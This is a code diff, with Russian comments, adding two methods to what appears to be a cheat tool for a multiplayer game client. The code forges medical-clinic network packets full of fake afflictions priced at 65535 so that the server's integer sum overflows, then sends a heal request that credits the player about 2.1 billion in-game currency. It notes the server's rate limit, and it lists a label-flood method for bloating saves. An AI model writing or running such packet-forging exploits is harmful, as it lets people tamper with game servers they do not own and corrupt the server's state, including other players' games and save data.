@@ -123,6 +123,30 @@ namespace CSHUB.Modules
         {
             new Method
             {
+                Title = "💰 CLINIC OVERFLOW — печатный станок (+2.1B)",
+                Desc =
+"НОВОЕ (600)! GetTotalCost суммирует КЛИЕНТСКИЙ Price (ushort)\n" +
+"в int: ~32770 аффликций × 65535 → ПЕРЕПОЛНЕНИЕ В МИНУС →\n" +
+"HEAL делает TryDeduct(-2.1B) = +2.1 МИЛЛИАРДА mk тебе.\n\n" +
+"EXEC: шлёт N пакетов ADD_PENDING ×3000 аффликций (Price=65535,\n" +
+"несуществующий identifier, фейковый CharacterInfoID — лечение\n" +
+"ничего не лечит, только считает цену). НУЖНО ≥11 ПАКЕТОВ,\n" +
+"потом жми «HEAL — получить деньги».\n" +
+"Условие: в раунде, кампания. Rate limit 20/5с — ок.",
+                Exec = ExecClinicOverflow
+            },
+            new Method
+            {
+                Title = "💰 HEAL — получить деньги (+2.1B)",
+                Desc =
+"Шаг 2 печатного станка: HEAL_PENDING → сервер суммирует\n" +
+"замараенную очередь → переполнение → TryPurchase(отрицательная\n" +
+"цена) → TryDeduct в минус = БАЛАНС РАСТЁТ на ~2.1B.\n\n" +
+"Сначала EXEC «CLINIC OVERFLOW» (≥11 пакетов), потом ЭТА.",
+                Exec = ExecClinicHeal
+            },
+            new Method
+            {
                 Title = "☣ LABEL FLOOD ×N меток (сейв-блоат)",
                 Desc =
 "cb.AddLabel() ×N — прямой клиентский API (правильные ID).\n" +
@@ -675,6 +699,62 @@ namespace CSHUB.Modules
         // ========================================================
         //  МЕТОДЫ
         // ========================================================
+        // ========================================================
+        //  💰 CLINIC OVERFLOW (волна 600): Price-переполнение
+        // ========================================================
+        private const int ClinicHeaderAddPending = 4;    // MedicalClinic.NetworkHeader.ADD_PENDING
+        private const int ClinicHeaderHeal = 7;          // MedicalClinic.NetworkHeader.HEAL_PENDING
+
+        private static string ExecClinicOverflow(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
+            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
+
+            int packets = Math.Min(Math.Max(n, 1), 12);
+            int perPacket = 3000;
+            for (int p = 0; p < packets; p++)
+            {
+                var afflictions = new MedicalClinic.NetAffliction[perPacket];
+                for (int i = 0; i < perPacket; i++)
+                {
+                    afflictions[i] = new MedicalClinic.NetAffliction
+                    {
+                        Identifier = "zzz_clinic_overflow".ToIdentifier(),
+                        Strength = 0,
+                        VitalityDecrease = 0,
+                        Price = 65535
+                    };
+                }
+                var member = new MedicalClinic.NetCrewMember
+                {
+                    CharacterInfoID = 90000 + p,   // уникальный — не дедупнется
+                    Afflictions = ImmutableArray.Create(afflictions)
+                };
+
+                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
+                msg.WriteByte(ClinicHeaderAddPending);
+                ((INetSerializableStruct)member).Write(msg);
+                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            }
+            long total = (long)packets * perPacket * 65535;
+            return "ADD_PENDING ×" + packets + " (" + (packets * perPacket) +
+                   " аффликций, сумма " + total + " → int overflow при ≥32770). Теперь жми HEAL!";
+        }
+
+        private static string ExecClinicHeal(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде"; }
+            for (int i = 0; i < Math.Min(n, 5); i++)
+            {
+                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
+                msg.WriteByte(ClinicHeaderHeal);
+                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            }
+            return "HEAL отправлен. Если очередь замараена (≥32770 × 65535) — баланс += ~2.1B";
+        }
+
         private static string ExecSegmentTable(int n)
         {
             if (!CanSend()) { return "нет подключения"; }
